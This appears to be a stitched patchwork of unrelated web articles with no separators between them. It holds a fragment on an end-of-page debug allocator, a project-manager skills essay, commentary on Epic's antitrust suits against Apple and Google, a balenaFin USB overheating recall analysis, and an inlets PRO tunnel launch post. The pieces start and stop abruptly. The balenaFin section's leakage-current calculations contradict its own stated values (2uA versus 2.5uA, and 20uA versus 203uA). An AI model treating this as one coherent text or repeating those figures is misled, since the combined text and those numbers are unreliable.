    return (system_id_t *)(sys-&gt;id_block + sys-&gt;id_block_used++);
}
</code></pre>

<p>Note that by using a pointer to an opaque struct for the ID we also get some type safety, that we didn’t have with the <code>uint64_t</code> approach.</p>

<h2 id="memory-overwrite-detection">Memory overwrite detection</h2>

<p>One of the hardest bugs to fix is random memory overwrites, where some piece of code is writing to memory that it shouldn’t touch. Then, later, when some other piece of code tries to use that memory, it will read that trash data and (most likely) crash. The problem here is that while the crash itself is easy to find, it is tricky to know where the bad write that corrupted the data to begin with occurred.</p>

<p>Luckily, virtual memory can help us here too.</p>

<p>To see why, first note that the term <em>random memory overwrite</em> is actually a misnomer. Just like regular space, address space is mostly empty. With a 64 bit address space and an application size of say 2 GB, the address space is 99.999999988 % empty. This means that if the memory overwrites were truly random, most likely they would hit this empty space and cause a <em>page fault/access violation</em>. That would give us a crash at the point of the bad write, instead of the innocent read, which would make the bug much easier to find and fix.</p>

<p>But of course, the writes are usually not truly random. Instead they typically fall in one of two categories:</p>

<ul>
<li>Writing to memory that has been freed.</li>
<li>Writing beyond the allocated memory for an object.</li>
</ul>

<p>In both cases, it is pretty likely that the write will actually hit some other object, rather than empty space. In the first case, the memory will probably have been recycled for something else. In the second case, the write will probably hit a neighboring object, or allocation block headers.</p>

<p>We can make these cases look more like the random case by replacing the standard system allocator with an end-of-page allocator. Such an allocator uses the virtual memory system to allocate each object on its own set of pages, and furthermore, it aligns the object so that the end of the object coincides with the end of the last page.</p>


<figure>
    
        <img src="https://ourmachinery.com/images/end-of-page.png">
    
    
    <figcaption>
        <h4>End of page block placement.</h4>
        
    </figcaption>
    
</figure>


<p>This accomplishes two things. First, when we free the pages, we free them in the virtual memory system. This means that attempting to write to the pages after they have been freed will result in an access violation. Note that this typically doesn’t happen with a regular memory allocator — it will save the freed memory in its freelists to be used for other allocations, instead of returning it to the OS.</p>

<p>Second, as the end of the block coincides with the end of the page, writing beyond the end of the block will also cause an access violation. In other words, with this approach, our typical bad memory writes will crash at the point of the write and allow us to easily diagnose the problem.</p>

<p>Since this allocator rounds up all allocations to the page size, it will waste a lot of memory for small allocations. It is probably not something that you want enabled all the time. What I typically do is work with the standard allocator. Then, if I suspect bad memory overwrites, I switch it out for the end-of-page allocator. Once I’ve fixed the problem, I switch back to the standard allocator. This of course requires you to have an architecture where you can easily change which allocator your system is using.</p>

<p>Writing an end end-of-page allocator is not complicated at all. Here’s what <code>malloc</code> looks like:</p>

<pre><code>void *eop_malloc(uint64_t size)
{
    uint64_t pages = (size + PAGE_SIZE - 1) / PAGE_SIZE;
    char *base = virtual_alloc(pages * PAGE_SIZE);
    uint64_t offset = pages * PAGE_SIZE - size;
    return base + offset;
}
</code></pre>

<p>Note: There’s still bad writes that could go undetected with this approach. For example, after we’ve freed the pages, a new page allocation could happen in the same memory range. Also, it is possible that another set of pages could be allocated directly after ours in memory, in which case we wouldn’t detect overwrites beyond the last page.</p>

<p>Both these problems can be fixed. For the first issue, we can leave the pages reserved, but not committed. That way, the physical memory is freed and we will get page faults, but the addresses are reserved and cannot be used by other objects. For the second issue, we could reserve an extra page after our pages, but not commit that page. No other object could then claim those addresses and writing to them would still …</p></section></article></div></div>

Sometimes you, as a project manager, feel like they are responsible for everything. Since your performance directly affects the success rate of the entire project. Project managers not only manage tasks but, most importantly, thoroughly guide the team toward the project goals. Being a great project manager requires interdisciplinary approaches and the ability to master both hard and soft skills. Let’s have a closer look at three essential competencies for the project manager to be successful.</p><figure><div><div><div><p><img alt="Successful Project Manager Skills. Technical, Leadership, Business" src="https://miro.medium.com/max/8548/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg" width="4274" height="1186" srcset="https://miro.medium.com/max/552/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg 276w, https://miro.medium.com/max/1104/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg 552w, https://miro.medium.com/max/1280/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg 640w, https://miro.medium.com/max/1400/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Hy2Y4ZwojpAn6HDLFa8IBg.jpeg?q=20"></p></div></div></div></figure><p id="0264">Even though you don’t need extensive technical knowledge, having at least some competencies is a must. It will allow you to effectively interact with your team and contribute ideas to technical and business-related discussions, ask the right questions, and provide adequate answers. Most importantly, technical skills help project managers to evaluate the feasibility of the desired feature to a specific product and design a strategy for its future implementation.</p><p id="19fd">It is also an excellent tool for resource management, i.e., you will be able to identify skill gaps in the team, and timely fill them in by bringing a new team member, organizing consultation, or replacing one of the specialists in the team.</p><figure><div><div><div><p><img alt="Project Manager technical skills" src="https://miro.medium.com/max/2682/0*bGrOhr7yG0UPT6gZ" width="1341" height="826" srcset="https://miro.medium.com/max/552/0*bGrOhr7yG0UPT6gZ 276w, https://miro.medium.com/max/1104/0*bGrOhr7yG0UPT6gZ 552w, https://miro.medium.com/max/1280/0*bGrOhr7yG0UPT6gZ 640w, https://miro.medium.com/max/1400/0*bGrOhr7yG0UPT6gZ 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bGrOhr7yG0UPT6gZ?q=20"></p></div></div></div></figure><h2 id="d2e8">What do technical skills imply?</h2><ul><li id="e096"><strong>Programming and Coding<em>.</em> </strong>You don’t need to have a degree in software engineering and years of experience working as a developer; it is more important to read the code and understand its architecture.</li><li id="ef53"><strong>Data Analysis<em>.</em></strong> Nowadays, we are getting overwhelmed by the amount of data on our hands. Therefore, it’s necessary to acquire skills that will help you to extract all the relevant information from the stack of data and then use it to create trends that are going to help you to answer important questions concerning business activity.</li><li id="14dc"><strong>System Analysis<em>.</em> </strong>In many small firms, which cannot afford to get separate specialists both for system analysis and project management, these positions are being filled by one person. So, there is a common ground between these jobs because they require the same set of skills from a person, such as excellent verbal communication, strategic thinking, and organizational skills.</li></ul><h2 id="9eb5">How can you develop the above technical skills?</h2><ul><li id="9b5a"><strong>Communicate with technical specialists<em>.</em></strong> If you have any queries, do not hesitate to ask questions. Most of the developers that I worked with are very passionate about their job, so they will be more than happy to explain some concepts and IT specifics.</li><li id="f35f"><strong>Gather relevant technical information from similar projects<em>.</em></strong> Learn the background and specifics of feature development from other products.</li><li id="eaca"><strong>Be curious about development processes<em>.</em></strong> Be interested in all the technical processes and keep continually improving them. I would also suggest focusing on the QA process. Try to understand it thoroughly, everything from the process itself to the tools which can help. It will ensure the development of a quality product.</li></ul><p id="0ec6">In conclusion, if you are entering this career without a technical background, don’t feel overwhelmed. It’s all about your aspiration to learn and the ability to communicate with the team effectively. You may start getting the technical skills with a couple of basic coding courses and continue developing them by reading the articles daily. If you have some humble technical experience, you can use your knowledge to back up the team by performing simple and mundane tasks. In turn, it will contribute to the smoother project delivery, improved development processes, and will help you in monitoring metrics.</p><figure><div><div><div><p><img alt="Project manager technical skills" src="https://miro.medium.com/max/2564/0*YkvqcH9oq08w0M-T" width="1282" height="869" srcset="https://miro.medium.com/max/552/0*YkvqcH9oq08w0M-T 276w, https://miro.medium.com/max/1104/0*YkvqcH9oq08w0M-T 552w, https://miro.medium.com/max/1280/0*YkvqcH9oq08w0M-T 640w, https://miro.medium.com/max/1400/0*YkvqcH9oq08w0M-T 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YkvqcH9oq08w0M-T?q=20"></p></div></div></div></figure><p id="3ec5">Business skills imply the ability to analyze the market, organization, customer behavior, and then use this knowledge to provide the best business results. It includes in itself a lot of things from being able to conduct proper market research, business planning to communication with your stakeholders. Every project manager deals with these tasks daily, starting from the planning stage, where you evaluate the feasibility of a feature and the value it will bring to an end customer to understand the long-term goals of a business to which you will align its further strategy. It is not something exceptionally hard, just as with any other skill to develop it, you need to be curious, use your critical thinking and practice.</p><h2 id="ec35">What do strategic and business skills imply?</h2><ul><li id="4639"><strong>Strategic planning<em>.</em> </strong>A strategic plan defines the project’s goals, visions, and missions. Thus helping employees stay on track and increase their overall engagement and productivity. As a project manager, you need to understand that the long-term perspectives of the product are essential for aligning and scheduling present work to them and managing risks.</li><li id="3ae2"><strong>Decision-making skills<em>.</em> </strong>At the beginning of their career, project managers can hesitate in the moments when they are required to make decisions that might affect the team members and future project’s life cycle. Therefore, it is essential to build confidence and determination and evaluate a variety of options to bring the best outcome for the business. This will eventually come with experience, but remember that making mistakes is okay, asking for help is okay, but being feckless and not taking responsibility for your actions is not okay.</li><li id="fe3c"><strong>Negotiation skills<em>.</em> </strong>A project manager is that person in a project who negotiates with all different stakeholders daily to bring the best possible result for a business. You have to negotiate agreements with the stakeholders and team members and customers when you ask for more resources, bidding prices, convincing executive bodies for extensions, and so on. But most importantly, you need negotiation skills to match the needs of all the stakeholders to a mutual goal for clear work prioritization.</li></ul><figure><div><div><div><p><img alt="Project manager buisness skills" src="https://miro.medium.com/max/2250/0*NnWxT1UxmZtmsVTL" width="1125" height="737" srcset="https://miro.medium.com/max/552/0*NnWxT1UxmZtmsVTL 276w, https://miro.medium.com/max/1104/0*NnWxT1UxmZtmsVTL 552w, https://miro.medium.com/max/1280/0*NnWxT1UxmZtmsVTL 640w, https://miro.medium.com/max/1400/0*NnWxT1UxmZtmsVTL 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*NnWxT1UxmZtmsVTL?q=20"></p></div></div></div></figure><h2 id="5d2e">How can you develop this skill?</h2><ul><li id="97c7"><strong>Explore more business cases<em>.</em></strong> Research as many competitors’ products as you can, analyze why they were successful or not both from the technical and marketing side. This will enhance your knowledge and thus provide you with more options when making decisions.</li><li id="2cd0"><strong>Pay attention to clients’ needs<em>.</em></strong> As a project manager, you should always check on the end-users of the product. It means identifying their problems and needs and solving them. You can do this by stating hypotheses, testing them, analyzing the results over and over again.</li><li id="9de1"><strong>Be informed<em>.</em></strong> Pay attention to updates on similar products. Research what worked and did not from the marketing and business side. Take notes and draw lessons from their experience to use this knowledge while developing your product.</li></ul><p id="0e19">The main objective of applying your business skills lies in developing a perfectly functioning product that will generate higher revenue for the client or optimize current expenses. Let’s consider a case: your team is working on a startup project. For startups, especially in the early stages, one of the most common ways to prove they can get this project on the next funding round. Though startup founders focus more on a discussion of features during meetups with technical teams, it’s essential for you, as a project manager, to dig deeper and evaluate the criteria for entering the next seeding round (user base, monetization, etc.) are. Then further ensure the achievement of this goal. Understanding the project objectives and deliverables will give you flexibility in decision-making and adjusting the plan to change. You develop the product, not for features, but to bring value to the client and end-users.</p><p id="c6a3">Leadership is a set of strategies that help managers deal with problems, achieve positive results, and adapt to the changing environment. On top of being a great strategist, who has an extensive knowledge in both technical and business-related spheres you need to have that inner charm and energetic personality that will inspire and drive the team to do bigger and better things. A project manager is not only someone who follows processes, creates tasks in Jira, or communicates with a client. A project manager is a person who can predict possible risks well in advance, eliminates them, and maximizes the team’s results. Every manager adopts their style of leadership; it can be more autocratic or democratic. Your choice should depend on your employees’ personalities because some require more guidance, while others feel suffocated by rules. So, you have to be good at reading people’s characters, which will help match your style to their needs and create an environment where their skills and talents can thrive.</p><figure><div><div><div><p><img alt="Project manager leadership skills" src="https://miro.medium.com/max/2802/0*VkmK4Vr1E3__MonT" width="1401" height="872" srcset="https://miro.medium.com/max/552/0*VkmK4Vr1E3__MonT 276w, https://miro.medium.com/max/1104/0*VkmK4Vr1E3__MonT 552w, https://miro.medium.com/max/1280/0*VkmK4Vr1E3__MonT 640w, https://miro.medium.com/max/1400/0*VkmK4Vr1E3__MonT 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*VkmK4Vr1E3__MonT?q=20"></p></div></div></div></figure><ul><li id="30a4"><strong>Communication skill<em>.</em> </strong>Communication is key to becoming a great leader, whether it concerns delivering business goals to team members or having a one-on-one conversation. Being a good listener, transparent, speaking clearly, and concisely, asking relevant questions. All of these aspects are essential. They are not as easy as they sound, but with the right training and sufficient experience, you will be able to master it.</li><li id="58b9"><strong>People management<em>.</em> </strong>It is a set of skills that let you effectively interact, train, and motivate employees to improve productivity and boost their professional and personal growth. You are going to work closely with many individuals who have completely different personalities.

<div>
<p>Epic Games introduced an update to their mobile (iOS and Android) version of Fortnite that allows users to buy directly from Epic Games at a 20% discount, removing incentives to pay with the officially sanctioned payment systems on the App Store and Play Store.&nbsp;</p>



<p>Soon after this update, Apple removed Fortnite from its App Store, Google was not far behind in doing the same. In response, Epic Games has filed individual suits against both tech giants claiming that their behaviour is monopolistic control over their respective ecosystems. However, there is some nuance and differences that we should explore between the two ecosystems that could have implications for the validity of the anti-trust lawsuits that Epic will have to contend with.&nbsp;</p>



<p>Looking at the two ecosystems holistically, it is perhaps more appropriate in this case to think of Android and iOS as marketplaces rather than solely focusing on their function as operating systems. The contention is that the marketplaces are being monopolised and controlled to the disadvantage of developers. This is especially true of Apple iOS, where the entire OS is a marketplace, where the App Store is the only access point for third-party applications to the ecosystem. If an application is removed from the App Store, the third-party application simply cannot exist on the iOS ecosystem.&nbsp;</p>



<p>Comparatively, Google’s Android OS functions a little differently. The OS acts as an open ecosystem which is augmented by the Play Store. The Play Store, not the OS, is the marketplace – the place for discovery. The Play Store as a standalone application can have comparative and competitive marketplaces on the Android OS, like the Samsung store. Further, the Android OS allows for third-party installs of applications albeit with security warnings.&nbsp;</p>



<p>Epic might have a hard time arguing that Google is being anti-competitive when it has avenues of access – albeit less direct – outside of the Google Play Store. Applications can still exist within the Android ecosystem even when the Play Store removes listings according to their marketplace rules.</p>



<p>Apple, on the other hand, has its entire ecosystem siloed as a marketplace, with no third-party marketplaces allowed and no ability to legally install third-party applications – placing them in a much more difficult position when it comes to anti-competitive claims. In recent months, Apple has come under increasing scrutiny as they butt heads with application developers, most notably Hey email client, Google’s Stadia platform and Microsoft’s xCloud platform.&nbsp;</p>

If you think your balenaFin might be affected, please follow the instructions outlined <a href="https://store.balena.io/pages/product-recall-announcement">here</a>.</p>

<p>This issue prevents affected balenaFins from accessing any USB peripherals when the ambient temperature rises above 45-50°C (113-132°F). It also means that those devices relying on ethernet connectivity are disconnected at these higher temperatures since the ethernet bridge is also USB-based.</p>

<p>Based on our estimates, around 90% of all deployed balenaFins are likely affected by this issue. We are fully aware that a recall negatively impacts our customers and introduces friction in their fleet operations, which we, as a company, strive to reduce. <br>
Ultimately, it is our responsibility to take this as a learning opportunity to improve our processes. We now have a more robust testing procedure for both our design and manufacturing processes. The performance of every connectivity protocol at low and high operational temperatures is now part of our standard suite of tests.</p>

<p>This blogpost aims to offer an in-depth technical explanation of the underlying issue and the steps we are taking to prevent this from happening again.</p>

<h3 id="balenafinusbtopology">balenaFin USB topology</h3>

<p><img src="https://www.balena.io/blog/content/images/2020/08/USB-topology-diagram.png" alt="" title="">  </p>

<p>Key components of the balenaFin's USB topology are presented in figure 1. The two main blocks are the USB hub and switch, which allows for regular USB operation and internal eMMC flashing.</p>

<p>The USB hub is based on the LAN9514i chipset (LAN9514 on the v1.0 revision), which has an integrated USB to Ethernet bridge (PHY included). This structure has the benefit of a considerably smaller footprint, but it also means that if the hub is disconnected, so will the Ethernet connection.</p>

<p>The USB switch works by sensing power (VBUS) on the micro-USB connector. When a powered device is detected, the USB interface on the compute module is wired directly to the micro-USB connector. When no powered device is detected, the compute module is connected to the USB hub. The former situation only occurs when the balenaFin is connected to a host device (PC or laptop) to flash the internal eMMC memory.</p>

<h3 id="reportedissues">Reported issues</h3>

<p>The first report of a potential operating temperature issue was posted in our forums in June 2019:</p>

<ul>
<li><a href="https://forums.balena.io/t/questions-around-thermal-restarts-on-the-fin/17330">https://forums.balena.io/t/questions-around-thermal-restarts-on-the-fin/17330</a></li>
</ul>

<p>We concluded that the USB power protections were being triggered by the heat generated from a combination of high current draw and CPU load. This theory seemed to be confirmed by the fact that placing a heatsink on top of the USB protection chips made the issue disappear. </p>

<p>In retrospect, we missed that the addition of vents also reduced the ambient temperature inside the case, hinting that something else might have been going on. </p>

<p>Approximately a year later, another balenaFin customer contacted us via our balenaCloud support chat to report a similar issue. The following situation was also reported in our forums around that time:</p>

<ul>
<li><a href="https://forums.balena.io/t/thermal-operating-range-of-balenafin/150982">https://forums.balena.io/t/thermal-operating-range-of-balenafin/150982</a></li>
</ul>

<p>With the help of a customer who performed an extensive early investigation, we extracted two previously unknown facts:</p>

<ul>
<li>The Ethernet interface was being disconnected along with the plugged USB devices.</li>
<li>balenaFin revision (v1.0) did not appear to be affected.</li>
</ul>

<p>With this new information, we decided to launch a full investigation to test the v1.1 balenaFin's performance at higher temperatures. <br>
While the v1.0 balenaFin was fully tested under high temperatures, the v1.1 balenaFin was only subject to a limited test suite (cold-boot and power-cycle). There were two main reasons for that:</p>

<ul>
<li>Since the LAN9514i hub is individually tested for performance at high temperatures by the manufacturer, we decided to skip this test.</li>
<li>The only other change related to the USB circuitry was the ability to power from the micro-USB port. This is only used when flashing the balenaFin memory, and not intended to be done at high temperatures.</li>
</ul>

<h3 id="investigation">Investigation</h3>

<p>We performed a series of tests in a temperature-controlled chamber that was set to reach an ambient temperature of 80°C, heating at a rate of 1°C/minute. Once the maximum temperature was reached, the devices were left idle for a minimum of 30 minutes before performing any further operations.</p>

<h6 id="july6th">July 6th</h6>

<p><strong>Test #1:</strong>  </p>

<ul>
<li>Device: Standard v1.0 balenaFin.  </li>
<li>Result: No issues were found on the USB subsystem and no functional degradation was observed. </li>
</ul>

<p><strong>Test #2:</strong>  </p>

<ul>
<li>Device: Standard v1.1 Fin. </li>
<li>Result: At 48C ambient temperature, the USB peripherals connected were suddenly shut down. Ethernet connectivity was also lost.  </li>
<li>Observations: Kernel logs reported that the USB hub was disconnected and no longer accessible.  </li>
</ul>

<p>Note: the above tests were repeated in every session with the exact same results.</p>

<p><strong>Test #3:</strong>   </p>

<ul>
<li>Device: Modified v1.1 balenaFin with the USB power controllers removed.  </li>
<li>Results: We experienced the same issues as the unmodified v1.1 balenaFin.  </li>
<li>Observations: This test's objective was to review our original hypothesis that the USB power controllers are the root cause of the issue. The result disproved our initial hypothesis. </li>
</ul>

<h6 id="july10th">July 10th</h6>

<p><strong>Test #1:</strong>  </p>

<ul>
<li>Device: Modified v1.1 balenaFin with the following changes: <br>
<ul><li>The USB header pins were removed, as this was a significant design change between revisions v1.0 and v1.1 and therefore stood out as a potential culprit  </li>
<li>Wire soldered to the 5V USB bus and connected to an oscilloscope.  </li>
<li>Wire soldered to the 3.3V rail and hooked to an oscilloscope.  </li></ul></li>
<li>Result: Same as unmodified v1.1 balenaFin.  </li>
<li>Observations: On the oscilloscope, we noticed some noise on the 3.3V rail right when the USB hub was shutting down. This noise suggested a potential issue between the power converters and the USB hub. After the device was power cycled at a constant temperature of 60C, the same glitches were observed every 2-3 seconds.</li>
</ul>

<p><strong>Test #2:</strong> </p>

<ul>
<li>Device: The balenaFin from test #1 was modified to cut power to the USB hub by desoldering L20. </li>
<li>Result: Power glitches were not observed. The USB hub was not powered so it remained disconnected throughout the entire test.</li>
<li>Observations: Results seemed to point to a power delivery issue at high temperatures. For further testing, we requested our contract manufacturer to produce a v1.1 balenaFin with a LAN9514 (instead of a LAN9514i) to rule out the potential of the issue being caused by a  faulty batch of USB hubs. Since the power delivery circuitry stayed mostly unchanged between revisions v1.0 and v1.1, it would also help us single out any power distribution faults. </li>
</ul>

<h6 id="july15th">July 15th</h6>

<p>During the previous testing sessions, we were able to consistently reproduce the issue at 45-50°C, allowing us to run tests locally without a professional heat chamber. </p>

<p>We proceeded to test an off-the-shelf v1.1 balenaFin with the LAN9514i replaced by a LAN9514. The results were mainly the same as previous tests, where the USB hub shut down at ~50°C, and the same noise was present in the power rails. <br>
To rule out power delivery being the root cause, we decided to power the USB hub from a separate bench power supply unit placed away from the heat source. Issues persisted with this setup, pointing us away from a power delivery problem.</p>

<p>During these last few tests, we realized that the hub would remain off if it did not receive any signal from the compute module, regardless if it was powered or not. The latter suggested that the issue might not be the hub powering off, but instead not receiving any input from the CM. </p>

<h3 id="rootcauseanalysis">Root cause analysis</h3>

<p>The issue was introduced by a seemingly unrelated change in revision v1.1 that allowed the balenaFin to be powered from the micro-USB port.</p>

<p><img src="https://www.balena.io/blog/content/images/2020/08/Power-schematics.png" alt=""></p>

<p>We used Schottky diodes to prevent back current being injected into a power supply in the accidental case where more than one power supply was connected.  </p>

<p>This type of diodes is widely used in power applications due to their relatively high forward current and low voltage drop. On the flip side, they typically have high reverse leakage current, which increases by an order of magnitude for every 25°C increase.  </p>

<p>Reverse current is hardly ever an issue when sunk by power supplies, even at high temperatures, but in our case, it was causing another undesirable side effect. As shown in figure 3, the USB switch senses the voltage on the micro-USB bus (5V_USB_DBG), and it is triggered when the transistor's gate voltage (Vg) reaches the transistor’s <code>on</code> level (typically 0.8V).  </p>

<p><img src="https://www.balena.io/blog/content/images/2020/08/USB-Switch-schematics.png" alt=""></p>

<p>For the sake of simplicity, the transistor gate current (Ig) can be considered zero, as its value is orders of magnitude lower than the reverse leakage current (Irl). At room temperature (25°C) the value of Irl is around 2uA, making the gate voltage:</p>

<p><code>Vg = Irl * R = 2.5uA * 47kOhm = 117.5mV</code></p>

<p>At 50°C, Irl becomes 20uA, so:</p>

<p><code>Vg = Irl * R = 203uA * 47kOhm = 940mV</code></p>

<p>At this temperature level, the gate voltage becomes high enough to turn the transistor on, tying the switch pin to ground and consequently disconnecting the USB hub from the compute module. </p>

<h3 id="fix">Fix</h3>

<p>The most straightforward way to reduce the impact of the leakage current in the circuit is to reduce the value of R116 (see image 3). Such value should be low enough such that  Vg never reaches 0.6V (which is the minimum 'on' voltage according to the transistor datasheet). <br>
There is a small downside to this approach; it will consume more power when the USB switch is on. Such a situation only happens when the balenaFin is put in mass storage device mode to flash the eMMC (powered by the micro-USB connector). In this case, the vast majority of the peripherals are off, minimizing the downside of a slightly larger current, so we decided this was an acceptable tradeoff. </p>

<p>We selected a value of 1kOhm, which makes the gate voltage:</p>

<p><code>Vg = Irl * R = 2uA *1kOhm = 2mV @ 25°C</code> <br>
<code>Vg = Irl * R = 20uA *1kOhm = 20mV @ 50°C</code> <br>
<code>Vg = Irl * R = 200uA *1kOhm = 200mV @ 75°C</code></p>

        <section>
            <div><p>inlets PRO is a secure, commercial TCP tunnel, built for connecting services in a Cloud Native way. Learn what it can do for you, and how it was built from OSS roots. At the end of the post, you'll be able to view the new landing page with both personal and commercial pricing, along with comparisons to other networking solutions.</p>
<p><img src="https://inlets.dev/images/inlets-pro-purple.png" width="50%" alt="inlets PRO"></p><h2 id="whatisinlets">What is inlets?</h2>
<p><a href="https://github.com/inlets/inlets">inlets</a> is an open-source network tunnel project that I built out in late 2018/2019. After a long history of working for enterprise companies, and facing troubling network conditions on the road (captive portals), and restrictive firewalls, I sat down to write some code and try and solve the problem.</p>
<p>To start with, the code (written in Go) was rudimentary, and serialised raw HTTP request and response objects over the wire. I'd decided to pick websockets for the transport, because I knew that a websocket could penetrate almost any network conditions by initiating an outbound call from a client to a well-known port on a HTTP server - 80 or 443.</p>
<p><img src="https://github.com/inlets/inlets/raw/master/docs/inlets.png" alt="inlets OSS architecture"></p>
<p>After the project gained traction, the proof of concept had served its purpose and I rewrote the code to use off the shelf libraries like <a href="https://github.com/gorilla/websocket">Gorilla's websocket library</a>.</p>
<p>Simply put, if you had a HTTP service on your laptop, Raspberry Pi, VM, Docker image, Windows PC, Mac, or Kubernetes cluster, using inlets you could expose it on another network, and that network was usually the Internet.</p>
<p>inlets 1.0 and 2.0 were released and <a href="https://github.com/inlets/inlets/blob/master/docs/community.md">attracted many comments on Hacker News and the project acquired is own community</a> of personal and commercial users. As of today, it has 6.5k GitHub stars and can be used via a Docker image or a static binary.</p>

<p>Despite running in conditions where tools like Ngrok were completely banned, or non-functional, the barrier to entry was still too high for some users. They were used to simply running a single command and connecting to a SaaS tunnel.</p>
<p>SaaS tunnels are notoriously difficult to access from corporate networks, and are hamstringed by silly limits like being active for only 7 hours, or limiting connections per minute, even to those who pay for the service.</p>
<p>The route I took for this was to create <a href="https://github.com/inlets/inletsctl">inletsctl</a> - a tool that could bootstrap a tunnel server or (exit-server) within a few moments on your favourite cloud.</p>
<p>inletsctl has a <a href="https://github.com/inlets/inletsctl/tree/master/pkg/provision">provision package</a> which can set up new hosts on DigitalOcean, Packet, Civo, Scaleway, AWS EC2, GCE, Azure, Linode, and Hetzner. There are five different contributors to this code, and you can think of it a little bit like a basic version of Terraform.</p>
<p>Here's how it works:</p>
<pre><code>inletsctl create --provider digitalocean \
 --region lon1 \
 --access-token-file ~/do-access-token
</code></pre>
<p>Then after a few moments, you'll get a "connection string" for your server.</p>
<pre><code>Using provider: digitalocean
Requesting host: relaxed-brahmagupta1 in lon1, from digitalocean
2020/08/13 10:02:19 Provisioning host with DigitalOcean
Host: 203721867, status: 
[1/500] Host: 203721867, status: new

[31/500] Host: 203721867, status: active

  IP: 206.189.124.232
  Auth-token: sO7tIBsy7FaVXb0HiVKXejsBvt6GEUGiSHbcMlrEo6d928cUIIjgPj7nJxnwFvM6

Command:
  export UPSTREAM=http://127.0.0.1:8000
  inlets client --remote "ws://206.189.124.232:8080" \
	--token "sO7tIBsy7FaVXb0HiVKXejsBvt6GEUGiSHbcMlrEo6d928cUIIjgPj7nJxnwFvM6" \
	--upstream $UPSTREAM

To Delete:
	inletsctl delete --provider digitalocean --id "203721867"
</code></pre>
<p>How much does it cost? As little as possible, around 5 USD / mo, and you can of course, run more than one tunnel server there if you wish.</p>
<h2 id="inletsintegratesdirectlywithkubernetes">inlets integrates directly with Kubernetes</h2>
<p>One of the other common complaints of the incumbant SaaS tunnels are that they do not integrate natively with Kubernetes, and when they do, they are still subjected to the same limits that we talked about above.</p>
<p>Enter the <a href="https://github.com/inlets/inlets-operator">inlets-operator</a> - the tagline is "Get Kubernetes LoadBalancers from within your private network."</p>
<p>It works by detecting any Service in your cluster of type "LoadBalancer" and then it acts just like inletsctl, setting up an exit-server on your favourite cloud. However, this time, rather than you running "inlets client" from your command-line, a Pod is deployed into the cluster, which connects a private service in your cluster to the new server with a public IP.</p>
<p>This works extremely well, and is much faster than getting an ALB for instance on Amazon's managed Kubernetes product, EKS.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-vip-k8s.png" alt="LE working behind inlets PRO"></p>
<p>See the tutorial: <a href="https://docs.inlets.dev/#/get-started/quickstart-ingresscontroller-cert-manager?id=expose-your-ingresscontroller-and-get-tls-from-letsencrypt">Expose Your IngressController and get TLS from LetsEncrypt</a></p>
<p>You can even bring your own IngressController along, since inlets PRO works at the TCP-level.</p>

<blockquote>
<p>Walk-through: Get LetsEncrypt certificates and public IPs for your private IngressController</p>
</blockquote>
<h2 id="likeapro">Like a PRO</h2>
<p>Shortly after introducing inlets, inletsctl, and the inlets-operator, I developed a need for more than just a HTTP tunnel and started planning and thinking how to go about this. I also wanted to make sure that the websocket itself had TLS configured automatically, with the OSS version of inlets, <a href="https://blog.alexellis.io/https-inlets-local-endpoints">it was up to the operator to add it with a reverse proxy</a>.</p>
<p>I wanted to deploy <a href="https://github.com/jetstack/cert-manager">cert-manager</a>, ingress-nginx and then to get TLS certificates from <a href="https://letsencrypt.org/">LetsEncrypt</a>, just like I would do on a public cluster. This didn't work, since the OSS version of inlets terminated TLS on the exit-server. I needed a tunnel that could pass-through TCP traffic.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-vip.png" alt="VIP"></p>
<p>I did something a little different with inlets PRO. I didn't open-source it, I worked in private, tested with a couple of trusted friends from the community, and then released only a binary.</p>
<p>The binary requires a JWT license code to work, and so I set up a "start a trial page" and sat back.</p>
<blockquote>
<p>As the founder of other open-source projects like <a href="https://www.openfaas.com/">OpenFaaS</a>, I was used to the following conversation with companies: "We will use your stuff for our production applications, and ask you for help for free, and no we won't sponsor, contribute to the project, or hire you for support."</p>
<p>With inlets PRO, the conversation changed. "We think we need your thing, we're almost certain of that. How much does it cost? A proof of concept, that sounds great, what will that cost?"</p>
</blockquote>
<p>As I mentioned on the <a href="https://kubernetespodcast.com/episode/116-independent-open-source/">Google Kubernetes Podcast this week</a>, companies don't pay for free. It's only when a pricing-gate is put in place, that value can be captured for the maintainer or vendor of software.</p>
<p>There's been dozens of trials issued already, and several large corporations that have expressed an interest, but not for what I expected.</p>
<p>Here are a couple of examples of how inlets PRO can be used:</p>
<ul>
<li><a href="https://medium.com/@burtonr/local-database-for-the-cloud-with-inlets-pro-ac0488cc54e0">Save Money by Connecting Your Local Database to the Public Cloud</a> by Burton Rheutan</li>
<li><a href="https://blog.brewsterops.dev/post/inlets-pro-homelab/">Inlets Pro Homelab Awesomeness</a> by Matt Brewster</li>
</ul>
<p>Most enterprise companies, it turns out have some legacy deployed on premises, and some deployed on a public cloud. They need to securely tunnel services from the private cluster to the public one, but they do not want to expose them on the Internet. Sometimes these services are also running without encryption, think of an ancient MSSQL service, that's full of key data for an API.</p>
<p><img src="https://github.com/inlets/inlets-pro/raw/master/docs/images/inlets-pro-split-plane.png" alt="Split plane, headless tunnel"></p>
<p>inlets PRO provided a way for them to replace VPNs, which were complex to set up and manage. It also provided a way for the data to be encrypted over the wire, and only tunneled to the remote network, not being exposed. Think of it like a private or headless tunnel, maybe a "hybrid service mesh."</p>
<p>inlets PRO works much like the original open source version and shares some code. The inletsctl and inlets-operator projects both have switches to use the PRO version of inlets.</p>
<h2 id="launchday">Launch day</h2>
<p>This journey started out as building an open-source tunnel to help developers get past the impasse of using severely-limited SaaS tunnels. The tooling that has developed subsequently, with help from the community, has made inlets even more useful and easy to use.</p>
<p>Today is about making inlets more sustainable as an option over the long-haul. It's about providing clear business value to companies and teams that have hybrid cloud, are tired of VPNs, or that simply need to work with customers and clients on other networks.</p>
